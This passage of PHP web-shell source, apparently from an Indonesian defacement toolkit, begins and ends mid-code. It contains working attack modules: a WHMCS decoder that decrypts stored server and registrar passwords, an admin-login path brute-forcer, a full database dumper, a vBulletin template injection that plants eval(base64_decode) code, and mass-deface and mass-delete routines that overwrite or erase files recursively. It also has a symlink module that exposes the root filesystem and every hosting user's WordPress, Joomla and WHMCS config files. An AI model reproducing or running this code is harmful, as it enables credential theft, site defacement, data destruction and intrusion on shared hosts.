<br><center><font size='5' color='#FFFFFF'><b>-=[ WHMCS Decoder ]=-</b></font></center>
<center>
<br>

<FORM action=''  method='post'>
<input type='hidden' name='form_action' value='2'>
<br>
<table class=tabnet style=width:320px;padding:0 1px;>
<tr><th colspan=2>WHMCS Decoder</th></tr>
<tr><td>db_host </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_host' value='localhost'></td></tr>
<tr><td>db_username </td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_username' value=''></td></tr>
<tr><td>db_password</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_password' value=''></td></tr>
<tr><td>db_name</td><td><input type='text' style='color:#FFFFFF;background-color:' class='inputz' size='38' name='db_name' value=''></td></tr>
<tr><td>cc_encryption_hash</td><td><input style='color:#FFFFFF;background-color:' type='text' class='inputz' size='38' name='cc_encryption_hash' value=''></td></tr>
<td>&nbsp;&nbsp;&nbsp;&nbsp;<INPUT class='inputzbut' type='submit' style='color:#FFFFFF;background-color:'  value='Submit' name='Submit'></td>
</table>
</FORM>
</center>
";

 if($_POST['form_action'] == 2 )
 {
 //include($file);
 $db_host=($_POST['db_host']);
 $db_username=($_POST['db_username']);
 $db_password=($_POST['db_password']);
 $db_name=($_POST['db_name']);
 $cc_encryption_hash=($_POST['cc_encryption_hash']);



    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
while($v = mysql_fetch_array($query)) {
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>Type</td><td>$type</td></tr>");
echo("<tr><td>Active</td><td>$active</td></tr>");
echo("<tr><td>Hostname</td><td>$hostname</td></tr>");
echo("<tr><td>Ip</td><td>$ipaddress</td></tr>");
echo("<tr><td>Username</td><td>$username</td></tr>");
echo("<tr><td>Password</td><td>$password</td></tr>");

echo "</table><br><br></center>";
}

    $link=mysql_connect($db_host,$db_username,$db_password) ;
        mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblregistrars");
echo("<center>Domain Reseller <br><table class=tabnet border='1'>");
echo("<tr><td>Registrar</td><td>Setting</td><td>Value</td></tr>");
while($v = mysql_fetch_array($query)) {
$registrar     = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
}
}
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'reverse')){
?>
<br>
<center><div id="sitelist"><a onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>"><div id='menu'>[ Reverse IP Lookup ] </a></center>
<br>
<?php
} elseif(isset($_GET['do']) && ($_GET['do'] == 'adfin'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;do=adfin" method="post">

<?php
set_time_limit(0);
error_reporting(0);
$list['front'] ="admin
adm
admincp
admcp
cp
modcp
moderatorcp
adminare
admins
cpanel
controlpanel";
$list['end'] = "admin1.php
adm/
_adm_
_admin_
_administrator_
operator
sika
adminweb
develop
ketua
redaktur
author
user
users
dinkesadmin
retel
panel
paneladmin
panellogin
redaksi
cp-admin
Login@web
admin1
admin2
admin3
admin4
admin5
admin6
admin7
admin8
admin9
admin10
master
master/index.php
master/login.php
terasadmin/index.php
terasadmin/login.php
rahasia
rahasia/login.php
rahasia/admin.php
rahasia/index.php
dinkesadmin/login.php
adminpmb
adminpmb/index.php
adminpmb/login.php
system
system/index.php
system/login.php
system/admin.php
webadmin
webadmin/index.php
webadmin/login.php
wpanel
wpanel/index.php
wpanel/login.php
adminpanel
adminpanel/index.php
adminpanel/login.php
adminkec
adminkec/index.php
adminkec/login.php
admindesa
admindesa/index.php
admindesa/login.php
adminkota
adminkota/index.php
adminkota/login.php
admin123
admin123/index.php
admin123/login.php
logout
logout/index.php
logout/login.php
logout/admin.php
adminweb_setting
admin1.html
admin
administrator
admin1.html
admin2.php
admin2.html
yonetim.php
yonetim.html
yonetici.php
yonetici.html
ccms/
ccms/login.php
ccms/index.php
maintenance/
webmaster/
adm/
configuration/
configure/
websvn/
admin/
admin/account.php
admin/account.html
admin/index.php
admin/index.html
admin/login.php
admin/login.html
admin/home.php
admin/controlpanel.html
admin/controlpanel.php
admin.php
admin.html
admin/cp.php
admin/cp.html
cp.php
cp.html
administrator/
administrator/index.html
administrator/index.php
administrator/login.html
administrator/login.php
administrator/account.html
administrator/account.php
administrator.php
administrator.html
login.php
login.html
modelsearch/login.php
moderator.php
moderator.html
moderator/login.php
moderator/login.html
moderator/admin.php
moderator/admin.html
moderator/
account.php
account.html
controlpanel/
controlpanel.php
controlpanel.html
admincontrol.php
admincontrol.html
adminpanel.php
adminpanel.html
admin1.asp
admin2.asp
yonetim.asp
yonetici.asp
admin/account.asp
admin/index.asp
admin/login.asp
admin/home.asp
admin/controlpanel.asp
admin.asp
admin/cp.asp
cp.asp
administrator/index.asp
administrator/login.asp
administrator/account.asp
administrator.asp
login.asp
modelsearch/login.asp
moderator.asp
moderator/login.asp
moderator/admin.asp
account.asp
controlpanel.asp
admincontrol.asp
adminpanel.asp
fileadmin/
fileadmin.php
fileadmin.asp
fileadmin.html
administration/
administration.php
administration.html
sysadmin.php
sysadmin.html
phpmyadmin/
myadmin/
sysadmin.asp
sysadmin/
ur-admin.asp
ur-admin.php
ur-admin.html
ur-admin/
Server.php
Server.html
Server.asp
Server/
wp-admin/
administr8.php
administr8.html
administr8/
administr8.asp
webadmin/
webadmin.php
webadmin.asp
webadmin.html
administratie/
admins/
admins.php
admins.asp
admins.html
administrivia/
Database_Administration/
WebAdmin/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cPanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
members/
login-redirect/
sub-login/
wp-login.php
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
admin_area/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
server/
database_administration/
power_user/
system_administration/
ss_vms_admin_sm/
adminarea/
bb-admin/
adminLogin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
admin/admin.php
admin_area/admin.php
admin_area/login.php
siteadmin/login.php
siteadmin/index.php
siteadmin/login.html
admin/admin.html
admin_area/index.php
bb-admin/index.php
bb-admin/login.php
bb-admin/admin.php
admin_area/login.html
admin_area/index.html
admincp/index.asp
admincp/login.asp
admincp/index.html
webadmin/index.html
webadmin/admin.html
webadmin/login.html
admin/admin_login.html
admin_login.html
panel-administracion/login.html
nsw/admin/login.php
webadmin/login.php
admin/admin_login.php
admin_login.php
admin_area/admin.html
pages/admin/admin-login.php
admin/admin-login.php
admin-login.php
bb-admin/index.html
bb-admin/login.html
bb-admin/admin.html
admin/home.html
pages/admin/admin-login.html
admin/admin-login.html
admin-login.html
admin/adminLogin.html
adminLogin.html
home.html
rcjakar/admin/login.php
adminarea/index.html
adminarea/admin.html
webadmin/index.php
webadmin/admin.php
user.html
modelsearch/login.html
adminarea/login.html
panel-administracion/index.html
panel-administracion/admin.html
modelsearch/index.html
modelsearch/admin.html
admincontrol/login.html
adm/index.html
adm.html
user.php
panel-administracion/login.php
wp-login.php
adminLogin.php
admin/adminLogin.php
home.php
adminarea/index.php
adminarea/admin.php
adminarea/login.php
panel-administracion/index.php
panel-administracion/admin.php
modelsearch/index.php
modelsearch/admin.php
admincontrol/login.php
adm/admloginuser.php
admloginuser.php
admin2/login.php
admin2/index.php
adm/index.php
adm.php
affiliate.php
adm_auth.php
memberadmin.php
administratorlogin.php
admin/admin.asp
admin_area/admin.asp
admin_area/login.asp
admin_area/index.asp
bb-admin/index.asp
bb-admin/login.asp
bb-admin/admin.asp
pages/admin/admin-login.asp
admin/admin-login.asp
admin-login.asp
user.asp
webadmin/index.asp
webadmin/admin.asp
webadmin/login.asp
admin/admin_login.asp
admin_login.asp
panel-administracion/login.asp
adminLogin.asp
admin/adminLogin.asp
home.asp
adminarea/index.asp
adminarea/admin.asp
adminarea/login.asp
panel-administracion/index.asp
panel-administracion/admin.asp
modelsearch/index.asp
modelsearch/admin.asp
admincontrol/login.asp
adm/admloginuser.asp
admloginuser.asp
admin2/login.asp
admin2/index.asp
adm/index.asp
adm.asp
affiliate.asp
adm_auth.asp
memberadmin.asp
administratorlogin.asp
siteadmin/login.asp
siteadmin/index.asp
ADMIN/
paneldecontrol/
login/
cms/
admon/
ADMON/
administrador/
ADMIN/login.php
panelc/
ADMIN/login.html";
function template() {
echo '

<script type="text/javascript">
<!--
function insertcode($text, $place, $replace)
{
    var $this = $text;
    var logbox = document.getElementById($place);
    if($replace == 0)
        document.getElementById($place).innerHTML = logbox.innerHTML+$this;
    else
        document.getElementById($place).innerHTML = $this;
//document.getElementById("helpbox").innerHTML = $this;
}
-->
</script>
<br>
<br>
<h1 class="technique-two">



</h1>

<div class="wrapper">
<div class="red">
<div class="tube">
<center><table class="tabnet"><th colspan="2">Admin Finder</th><tr><td>
<form action="" method="post" name="xploit_form">

<tr>
<tr>
	<b><td>URL</td>
	<td><input class="inputz" type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 350px;" />
	</td>
</tr><tr>
	<td>404 string</td>
	<td><input class="inputz" type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 350px;" />
	</td></b>
</tr><br><td>
<span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
</span></td></tr>
</form></td></tr>
<br /></table>
</div> <!-- /tube -->
</div> <!-- /red -->
<br />
<div class="green">
<div class="tube" id="rightcol">
Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
<b>Found ones:<br /></b>
</div> <!-- /tube -->
</div></center><!-- /green -->
<br clear="all" /><br />
<div class="lime">
<div class="tube" id="logbox">
<br />
<br />
Admin page Finder :<br /><br />
</div> <!-- /tube -->
</div> <!-- /lime -->
</div> <!-- /wrapper -->
<br clear="all"><br>';
}
function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
    if($br == 1) $msg .= "<br />";
    echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
    if($stop == 1) exit;
    @flush();@ob_flush();
}
function check($x, $front=0) {
    global $_POST,$site,$false;
    if($front == 0) $t = $site.$x;
    else $t = 'http://'.$x.'.'.$site.'/';
    $headers = get_headers($t);
    if (!eregi('200', $headers[0])) return 0;
    $data = @file_get_contents($t);
    if($_POST['xploit_404string'] == "") if($data == $false) return 0;
    if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
    return 1;
}

// --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
template();
if(!isset($_POST['xploit_url'])) die;
if($_POST['xploit_url'] == '') die;
$site = $_POST['xploit_url'];
if ($site[strlen($site)-1] != "/") $site .= "/";
if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
$list['end'] = str_replace("\r", "", $list['end']);
$list['front'] = str_replace("\r", "", $list['front']);
$pathes = explode("\n", $list['end']);
$frontpathes = explode("\n", $list['front']);
show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
$verificate = 0;
foreach($pathes as $path) {
    show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #FFFFFF;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
    }
}
preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
if(substr($site, 0, 3) == "www") $site = substr($site, 4);
foreach($frontpathes as $frontpath) {
    show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #FFFFFF;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
  }

}
} elseif($_GET['do'] == 'dbdump')
    {
echo $head.'<p align="center">';
echo '
<form action method=post>
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";nn");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}

} elseif($_GET['do'] == 'vb') {
   {
   ?>
   <form action method="post">
   <br><br><br><div align="center">
   <H2><span style="font-weight: 400"><font face="Trebuchet MS" size="4">
   <b><font color="white">VB IndeX Changer</font></b>
   </div><br>
   <?php
   if(empty($_POST['index'])){
   echo "<center><FORM method=POST>";
   echo "<table class=tabnet>
<th colspan=2>Vb Index Changer</th>
<tr><td>host </td><td><input class=inputz type=text size=60 name=localhost value=localhost></td></tr>
<tr><td>database </td><td><input class=inputz type=text size=60 name=database value=forum_vb></td></tr>
<tr><td>username </td><td><input class=inputz type=text size=60 name=username value=user_vb></td></tr>
<tr><td>password </td><td><input class=inputz type=text size=60 name=password value=vb></td></tr>
</tr>
<th colspan=2>Your Index Code</th></table><table class=tabnet>
<TEXTAREA name=index rows=13 style='width: 450px; height: 200px;' border=1 cols=69 name=code>Your Index Code Here...</TEXTAREA><br>
<INPUT class=inputzbut type=submit value=setting name=send>
</FORM></table></center>";
    }else{
    $localhost = $_POST['localhost'];
    $database = $_POST['database'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $index = $_POST['index'];
    @mysql_connect($localhost,$username,$password) or die(mysql_error());
    @mysql_select_db($database) or die(mysql_error());
    $index=str_replace("'","'",$index);
    $set_index = "{${eval(base64_decode('";
    $set_index .= base64_encode("echo "$index";");
    $set_index .= "'))}}{${exit()}}</textarea>";
    echo("SET template ='".$set_index."' ") ;
    $ok=@mysql_query("SET template ='".$set_index."'") or die(mysql_error());
    if($ok){
    echo "Update success...<br><br>";
    } 
  }
}
} elseif($_GET['do'] == 'mass_deface') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='Exc.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Unknown1337</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
} elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=red>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
}
elseif($_GET['do'] == 'symconfig') {
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Skid this won\'t work on Windows")</script>';
exit;
}
else
{
if($_POST["m"] && !$_POST["passwd"]==""){
@mkdir("Exc_symconf", 0777);
@chdir("Exc_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex Excisjustice.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents(".htaccess",$htaccess);
$etc_passwd=$_POST["passwd"];
$etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[0];

@symlink('/','Exc_symconf/root');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
